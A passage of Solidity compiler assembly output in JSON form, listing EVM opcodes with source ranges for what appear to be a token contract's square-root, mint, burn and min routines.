											"end": 4683,
											"name": "PUSH [tag]",
											"value": "363"
										},
										{
											"begin": 4667,
											"end": 4676,
											"name": "DUP5"
										},
										{
											"begin": 4681,
											"end": 4682,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 4667,
											"end": 4683,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4667,
											"end": 4680,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 4667,
											"end": 4683,
											"name": "AND"
										},
										{
											"begin": 4667,
											"end": 4683,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4667,
											"end": 4683,
											"name": "tag",
											"value": "363"
										},
										{
											"begin": 4667,
											"end": 4683,
											"name": "JUMPDEST"
										},
										{
											"begin": 4649,
											"end": 4662,
											"name": "PUSH [tag]",
											"value": "364"
										},
										{
											"begin": 4649,
											"end": 4654,
											"name": "DUP7"
										},
										{
											"begin": 4659,
											"end": 4661,
											"name": "PUSH",
											"value": "11"
										},
										{
											"begin": 4649,
											"end": 4662,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4649,
											"end": 4658,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 4649,
											"end": 4662,
											"name": "AND"
										},
										{
											"begin": 4649,
											"end": 4662,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4649,
											"end": 4662,
											"name": "tag",
											"value": "364"
										},
										{
											"begin": 4649,
											"end": 4662,
											"name": "JUMPDEST"
										},
										{
											"begin": 4649,
											"end": 4666,
											"name": "SWAP1"
										},
										{
											"begin": 4649,
											"end": 4684,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4649,
											"end": 4666,
											"name": "PUSH [tag]",
											"value": "348"
										},
										{
											"begin": 4649,
											"end": 4684,
											"name": "AND"
										},
										{
											"begin": 4649,
											"end": 4684,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4649,
											"end": 4684,
											"name": "tag",
											"value": "362"
										},
										{
											"begin": 4649,
											"end": 4684,
											"name": "JUMPDEST"
										},
										{
											"begin": 4630,
											"end": 4684,
											"name": "SWAP1"
										},
										{
											"begin": 4630,
											"end": 4684,
											"name": "POP"
										},
										{
											"begin": 4706,
											"end": 4720,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4735,
											"end": 4746,
											"name": "DUP2"
										},
										{
											"begin": 4723,
											"end": 4732,
											"name": "DUP4"
										},
										{
											"begin": 4723,
											"end": 4746,
											"name": "DUP2"
										},
										{
											"begin": 4723,
											"end": 4746,
											"name": "PUSH [tag]",
											"value": "365"
										},
										{
											"begin": 4723,
											"end": 4746,
											"name": "JUMPI"
										},
										{
											"begin": 4723,
											"end": 4746,
											"name": "INVALID"
										},
										{
											"begin": 4723,
											"end": 4746,
											"name": "tag",
											"value": "365"
										},
										{
											"begin": 4723,
											"end": 4746,
											"name": "JUMPDEST"
										},
										{
											"begin": 4723,
											"end": 4746,
											"name": "DIV"
										},
										{
											"begin": 4723,
											"end": 4746,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4772,
											"end": 4785,
											"name": "DUP1"
										},
										{
											"begin": 4772,
											"end": 4785,
											"name": "ISZERO"
										},
										{
											"begin": 4768,
											"end": 4810,
											"name": "PUSH [tag]",
											"value": "367"
										},
										{
											"begin": 4768,
											"end": 4810,
											"name": "JUMPI"
										},
										{
											"begin": 4787,
											"end": 4810,
											"name": "PUSH [tag]",
											"value": "367"
										},
										{
											"begin": 4793,
											"end": 4798,
											"name": "DUP8"
										},
										{
											"begin": 4800,
											"end": 4809,
											"name": "DUP3"
										},
										{
											"begin": 4787,
											"end": 4792,
											"name": "PUSH [tag]",
											"value": "211"
										},
										{
											"begin": 4787,
											"end": 4810,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4787,
											"end": 4810,
											"name": "tag",
											"value": "367"
										},
										{
											"begin": 4787,
											"end": 4810,
											"name": "JUMPDEST"
										},
										{
											"begin": 4456,
											"end": 4829,
											"name": "POP"
										},
										{
											"begin": 4456,
											"end": 4829,
											"name": "POP"
										},
										{
											"begin": 4456,
											"end": 4829,
											"name": "POP"
										},
										{
											"begin": 4456,
											"end": 4829,
											"name": "tag",
											"value": "358"
										},
										{
											"begin": 4456,
											"end": 4829,
											"name": "JUMPDEST"
										},
										{
											"begin": 4297,
											"end": 4843,
											"name": "POP"
										},
										{
											"begin": 4297,
											"end": 4843,
											"name": "POP"
										},
										{
											"begin": 4297,
											"end": 4843,
											"name": "tag",
											"value": "354"
										},
										{
											"begin": 4297,
											"end": 4843,
											"name": "JUMPDEST"
										},
										{
											"begin": 4272,
											"end": 4910,
											"name": "PUSH [tag]",
											"value": "369"
										},
										{
											"begin": 4272,
											"end": 4910,
											"name": "JUMP"
										},
										{
											"begin": 4272,
											"end": 4910,
											"name": "tag",
											"value": "353"
										},
										{
											"begin": 4272,
											"end": 4910,
											"name": "JUMPDEST"
										},
										{
											"begin": 4863,
											"end": 4874,
											"name": "DUP1"
										},
										{
											"begin": 4863,
											"end": 4874,
											"name": "ISZERO"
										},
										{
											"begin": 4859,
											"end": 4910,
											"name": "PUSH [tag]",
											"value": "369"
										},
										{
											"begin": 4859,
											"end": 4910,
											"name": "JUMPI"
										},
										{
											"begin": 4898,
											"end": 4899,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4890,
											"end": 4895,
											"name": "PUSH",
											"value": "E"
										},
										{
											"begin": 4890,
											"end": 4899,
											"name": "SSTORE"
										},
										{
											"begin": 4859,
											"end": 4910,
											"name": "tag",
											"value": "369"
										},
										{
											"begin": 4859,
											"end": 4910,
											"name": "JUMPDEST"
										},
										{
											"begin": 4016,
											"end": 4916,
											"name": "POP"
										},
										{
											"begin": 4016,
											"end": 4916,
											"name": "POP"
										},
										{
											"begin": 4016,
											"end": 4916,
											"name": "SWAP3"
										},
										{
											"begin": 4016,
											"end": 4916,
											"name": "SWAP2"
										},
										{
											"begin": 4016,
											"end": 4916,
											"name": "POP"
										},
										{
											"begin": 4016,
											"end": 4916,
											"name": "POP"
										},
										{
											"begin": 4016,
											"end": 4916,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 352,
											"end": 653,
											"name": "tag",
											"value": "209"
										},
										{
											"begin": 352,
											"end": 653,
											"name": "JUMPDEST"
										},
										{
											"begin": 400,
											"end": 409,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 429,
											"end": 430,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 425,
											"end": 426,
											"name": "DUP3"
										},
										{
											"begin": 425,
											"end": 430,
											"name": "GT"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "ISZERO"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "PUSH [tag]",
											"value": "371"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 450,
											"end": 451,
											"name": "DUP1"
										},
										{
											"begin": 485,
											"end": 486,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 481,
											"end": 482,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 477,
											"end": 482,
											"name": "DUP3"
										},
										{
											"begin": 477,
											"end": 482,
											"name": "DIV"
										},
										{
											"begin": 477,
											"end": 486,
											"name": "ADD"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "tag",
											"value": "373"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "JUMPDEST"
										},
										{
											"begin": 511,
											"end": 512,
											"name": "DUP2"
										},
										{
											"begin": 507,
											"end": 508,
											"name": "DUP2"
										},
										{
											"begin": 507,
											"end": 512,
											"name": "LT"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "ISZERO"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "PUSH [tag]",
											"value": "374"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "JUMPI"
										},
										{
											"begin": 536,
											"end": 537,
											"name": "DUP1"
										},
										{
											"begin": 532,
											"end": 537,
											"name": "SWAP2"
										},
										{
											"begin": 532,
											"end": 537,
											"name": "POP"
										},
										{
											"begin": 573,
											"end": 574,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 568,
											"end": 569,
											"name": "DUP2"
										},
										{
											"begin": 564,
											"end": 565,
											"name": "DUP3"
										},
										{
											"begin": 560,
											"end": 561,
											"name": "DUP6"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "DUP2"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "PUSH [tag]",
											"value": "375"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "JUMPI"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "INVALID"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "tag",
											"value": "375"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "JUMPDEST"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "DIV"
										},
										{
											"begin": 560,
											"end": 569,
											"name": "ADD"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "DUP2"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "PUSH [tag]",
											"value": "376"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "JUMPI"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "INVALID"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "tag",
											"value": "376"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "JUMPDEST"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "DIV"
										},
										{
											"begin": 555,
											"end": 574,
											"name": "SWAP1"
										},
										{
											"begin": 555,
											"end": 574,
											"name": "POP"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "PUSH [tag]",
											"value": "373"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "JUMP"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "tag",
											"value": "374"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "JUMPDEST"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "POP"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "PUSH [tag]",
											"value": "378"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "JUMP"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "tag",
											"value": "371"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "JUMPDEST"
										},
										{
											"begin": 609,
											"end": 615,
											"name": "DUP2"
										},
										{
											"begin": 609,
											"end": 615,
											"name": "ISZERO"
										},
										{
											"begin": 605,
											"end": 647,
											"name": "PUSH [tag]",
											"value": "378"
										},
										{
											"begin": 605,
											"end": 647,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 635,
											"end": 636,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 605,
											"end": 647,
											"name": "tag",
											"value": "378"
										},
										{
											"begin": 605,
											"end": 647,
											"name": "JUMPDEST"
										},
										{
											"begin": 352,
											"end": 653,
											"name": "SWAP2"
										},
										{
											"begin": 352,
											"end": 653,
											"name": "SWAP1"
										},
										{
											"begin": 352,
											"end": 653,
											"name": "POP"
										},
										{
											"begin": 352,
											"end": 653,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1550,
											"end": 1750,
											"name": "tag",
											"value": "211"
										},
										{
											"begin": 1550,
											"end": 1750,
											"name": "JUMPDEST"
										},
										{
											"begin": 1625,
											"end": 1636,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1625,
											"end": 1636,
											"name": "SLOAD"
										},
										{
											"begin": 1625,
											"end": 1647,
											"name": "PUSH [tag]",
											"value": "380"
										},
										{
											"begin": 1625,
											"end": 1647,
											"name": "SWAP1"
										},
										{
											"begin": 1641,
											"end": 1646,
											"name": "DUP3"
										},
										{
											"begin": 1625,
											"end": 1647,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 1625,
											"end": 1640,
											"name": "PUSH [tag]",
											"value": "348"
										},
										{
											"begin": 1625,
											"end": 1647,
											"name": "AND"
										},
										{
											"begin": 1625,
											"end": 1647,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1625,
											"end": 1647,
											"name": "tag",
											"value": "380"
										},
										{
											"begin": 1625,
											"end": 1647,
											"name": "JUMPDEST"
										},
										{
											"begin": 1611,
											"end": 1622,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1611,
											"end": 1647,
											"name": "SWAP1"
										},
										{
											"begin": 1611,
											"end": 1647,
											"name": "DUP2"
										},
										{
											"begin": 1611,
											"end": 1647,
											"name": "SSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1673,
											"end": 1686,
											"name": "DUP4"
										},
										{
											"begin": 1673,
											"end": 1686,
											"name": "AND"
										},
										{
											"begin": 1673,
											"end": 1686,
											"name": "DUP2"
										},
										{
											"begin": 1673,
											"end": 1686,
											"name": "MSTORE"
										},
										{
											"begin": 1673,
											"end": 1682,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1673,
											"end": 1686,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1673,
											"end": 1686,
											"name": "MSTORE"
										},
										{
											"begin": 1673,
											"end": 1686,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1673,
											"end": 1686,
											"name": "SWAP1"
										},
										{
											"begin": 1673,
											"end": 1686,
											"name": "KECCAK256"
										},
										{
											"begin": 1673,
											"end": 1686,
											"name": "SLOAD"
										},
										{
											"begin": 1673,
											"end": 1697,
											"name": "PUSH [tag]",
											"value": "381"
										},
										{
											"begin": 1673,
											"end": 1697,
											"name": "SWAP1"
										},
										{
											"begin": 1691,
											"end": 1696,
											"name": "DUP3"
										},
										{
											"begin": 1673,
											"end": 1697,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 1673,
											"end": 1690,
											"name": "PUSH [tag]",
											"value": "348"
										},
										{
											"begin": 1673,
											"end": 1697,
											"name": "AND"
										},
										{
											"begin": 1673,
											"end": 1697,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1673,
											"end": 1697,
											"name": "tag",
											"value": "381"
										},
										{
											"begin": 1673,
											"end": 1697,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1657,
											"end": 1670,
											"name": "DUP4"
										},
										{
											"begin": 1657,
											"end": 1670,
											"name": "AND"
										},
										{
											"begin": 1657,
											"end": 1670,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1657,
											"end": 1670,
											"name": "DUP2"
										},
										{
											"begin": 1657,
											"end": 1670,
											"name": "DUP2"
										},
										{
											"begin": 1657,
											"end": 1670,
											"name": "MSTORE"
										},
										{
											"begin": 1657,
											"end": 1666,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1657,
											"end": 1670,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1657,
											"end": 1670,
											"name": "SWAP1"
										},
										{
											"begin": 1657,
											"end": 1670,
											"name": "DUP2"
										},
										{
											"begin": 1657,
											"end": 1670,
											"name": "MSTORE"
										},
										{
											"begin": 1657,
											"end": 1670,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1657,
											"end": 1670,
											"name": "DUP1"
										},
										{
											"begin": 1657,
											"end": 1670,
											"name": "DUP4"
										},
										{
											"begin": 1657,
											"end": 1670,
											"name": "KECCAK256"
										},
										{
											"begin": 1657,
											"end": 1697,
											"name": "SWAP5"
										},
										{
											"begin": 1657,
											"end": 1697,
											"name": "SWAP1"
										},
										{
											"begin": 1657,
											"end": 1697,
											"name": "SWAP5"
										},
										{
											"begin": 1657,
											"end": 1697,
											"name": "SSTORE"
										},
										{
											"begin": 1712,
											"end": 1743,
											"name": "DUP4"
										},
										{
											"begin": 1712,
											"end": 1743,
											"name": "MLOAD"
										},
										{
											"begin": 1712,
											"end": 1743,
											"name": "DUP6"
										},
										{
											"begin": 1712,
											"end": 1743,
											"name": "DUP2"
										},
										{
											"begin": 1712,
											"end": 1743,
											"name": "MSTORE"
										},
										{
											"begin": 1712,
											"end": 1743,
											"name": "SWAP4"
										},
										{
											"begin": 1712,
											"end": 1743,
											"name": "MLOAD"
										},
										{
											"begin": 1657,
											"end": 1670,
											"name": "SWAP3"
										},
										{
											"begin": 1657,
											"end": 1670,
											"name": "SWAP4"
										},
										{
											"begin": 1657,
											"end": 1670,
											"name": "SWAP2"
										},
										{
											"begin": 1657,
											"end": 1670,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH data",
											"value": "ADA389E1FC24A8587C776340EFB91B36E675792AB631816100D55DF0B5CF3CBC"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "CODECOPY"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MSTORE"
										},
										{
											"begin": 1712,
											"end": 1743,
											"name": "SWAP3"
										},
										{
											"begin": 1712,
											"end": 1743,
											"name": "DUP2"
										},
										{
											"begin": 1712,
											"end": 1743,
											"name": "SWAP1"
										},
										{
											"begin": 1712,
											"end": 1743,
											"name": "SUB"
										},
										{
											"begin": 1712,
											"end": 1743,
											"name": "SWAP1"
										},
										{
											"begin": 1712,
											"end": 1743,
											"name": "SWAP2"
										},
										{
											"begin": 1712,
											"end": 1743,
											"name": "ADD"
										},
										{
											"begin": 1712,
											"end": 1743,
											"name": "SWAP1"
										},
										{
											"begin": 1712,
											"end": 1743,
											"name": "LOG3"
										},
										{
											"begin": 1550,
											"end": 1750,
											"name": "POP"
										},
										{
											"begin": 1550,
											"end": 1750,
											"name": "POP"
										},
										{
											"begin": 1550,
											"end": 1750,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 134,
											"end": 237,
											"name": "tag",
											"value": "218"
										},
										{
											"begin": 134,
											"end": 237,
											"name": "JUMPDEST"
										},
										{
											"begin": 192,
											"end": 201,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 221,
											"end": 222,
											"name": "DUP2"
										},
										{
											"begin": 217,
											"end": 218,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 222,
											"name": "LT"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "PUSH [tag]",
											"value": "383"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "JUMPI"
										},
										{
											"begin": 229,
											"end": 230,
											"name": "DUP2"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "PUSH [tag]",
											"value": "384"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "JUMP"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "tag",
											"value": "383"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "JUMPDEST"
										},
										{
											"begin": 225,
											"end": 226,
											"name": "DUP3"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "tag",
											"value": "384"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "JUMPDEST"
										},
										{
											"begin": 213,
											"end": 230,
											"name": "SWAP4"
										},
										{
											"begin": 134,
											"end": 237,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 134,
											"end": 237,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2238,
											"end": 2446,
											"name": "tag",
											"value": "242"
										},
										{
											"begin": 2238,
											"end": 2446,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2319,
											"end": 2334,
											"name": "DUP3"
										},
										{
											"begin": 2319,
											"end": 2334,
											"name": "AND"
										},
										{
											"begin": 2319,
											"end": 2334,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2319,
											"end": 2334,
											"name": "SWAP1"
										},
										{
											"begin": 2319,
											"end": 2334,
											"name": "DUP2"
										},
										{
											"begin": 2319,
											"end": 2334,
											"name": "MSTORE"
										},
										{
											"begin": 2319,
											"end": 2328,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2319,
											"end": 2334,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2319,
											"end": 2334,
											"name": "MSTORE"
										},
										{
											"begin": 2319,
											"end": 2334,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2319,
											"end": 2334,
											"name": "SWAP1"
										},
										{
											"begin": 2319,
											"end": 2334,
											"name": "KECCAK256"
										},
										{
											"begin": 2319,
											"end": 2334,
											"name": "SLOAD"
										},
										{
											"begin": 2319,
											"end": 2345,
											"name": "PUSH [tag]",
											"value": "386"
										},
										{
											"begin": 2319,
											"end": 2345,
											"name": "SWAP1"
										},
										{
											"begin": 2339,
											"end": 2344,
											"name": "DUP3"
										},
										{
											"begin": 2319,
											"end": 2345,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2319,
											"end": 2338,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 2319,
											"end": 2345,
											"name": "AND"
										},
										{
											"begin": 2319,
											"end": 2345,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2319,
											"end": 2345,
											"name": "tag",
											"value": "386"
										},
										{
											"begin": 2319,
											"end": 2345,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2301,
											"end": 2316,
											"name": "DUP4"
										},
										{
											"begin": 2301,
											"end": 2316,
											"name": "AND"
										},
										{
											"begin": 2301,
											"end": 2316,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2301,
											"end": 2316,
											"name": "SWAP1"
										},
										{
											"begin": 2301,
											"end": 2316,
											"name": "DUP2"
										},
										{
											"begin": 2301,
											"end": 2316,
											"name": "MSTORE"
										},
										{
											"begin": 2301,
											"end": 2310,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2301,
											"end": 2316,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2301,
											"end": 2316,
											"name": "MSTORE"
										},
										{
											"begin": 2301,
											"end": 2316,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2301,
											"end": 2316,
											"name": "DUP2"
										},
										{
											"begin": 2301,
											"end": 2316,
											"name": "KECCAK256"
										},
										{
											"begin": 2301,
											"end": 2345,
											"name": "SWAP2"
										},
										{
											"begin": 2301,
											"end": 2345,
											"name": "SWAP1"
										},
										{
											"begin": 2301,
											"end": 2345,
											"name": "SWAP2"
										},
										{
											"begin": 2301,
											"end": 2345,
											"name": "SSTORE"
										},
										{
											"begin": 2369,
											"end": 2380,
											"name": "SLOAD"
										},
										{
											"begin": 2369,
											"end": 2391,
											"name": "PUSH [tag]",
											"value": "387"
										},
										{
											"begin": 2369,
											"end": 2391,
											"name": "SWAP1"
										},
										{
											"begin": 2385,
											"end": 2390,
											"name": "DUP3"
										},
										{
											"begin": 2369,
											"end": 2391,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2369,
											"end": 2384,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 2369,
											"end": 2391,
											"name": "AND"
										},
										{
											"begin": 2369,
											"end": 2391,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2369,
											"end": 2391,
											"name": "tag",
											"value": "387"
										},
										{
											"begin": 2369,
											"end": 2391,
											"name": "JUMPDEST"
										},
										{
											"begin": 2355,
											"end": 2366,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2355,
											"end": 2391,
											"name": "SWAP1"
										},
										{
											"begin": 2355,
											"end": 2391,
											"name": "DUP2"
										},
										{
											"begin": 2355,
											"end": 2391,
											"name": "SSTORE"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "DUP1"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "MLOAD"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "DUP4"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "DUP2"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "MSTORE"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "SWAP1"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "DUP6"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "AND"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH data",
											"value": "ADA389E1FC24A8587C776340EFB91B36E675792AB631816100D55DF0B5CF3CBC"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "CODECOPY"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MSTORE"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "SWAP2"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "SWAP1"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "DUP2"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "SWAP1"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "SUB"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "ADD"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "SWAP1"
										},
										{
											"begin": 2406,
											"end": 2439,
											"name": "LOG3"
										},
										{
											"begin": 2238,
											"end": 2446,
											"name": "POP"
										},
										{
											"begin": 2238,
											"end": 2446,
											"name": "POP"
										},
										{
											"begin": 2238,
											"end": 2446,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1756,
											"end": 2232,
											"name": "tag",
											"value": "293"
										},
										{
											"begin": 1756,
											"end": 2232,
											"name": "JUMPDEST"
										},
										{
											"begin": 1849,
											"end": 1853,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1911,
											"end": 1932,
											"name": "DUP4"
										},
										{
											"begin": 1911,
											"end": 1932,
											"name": "AND"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "PUSH [tag]",
											"value": "389"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "JUMPI"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "DUP1"
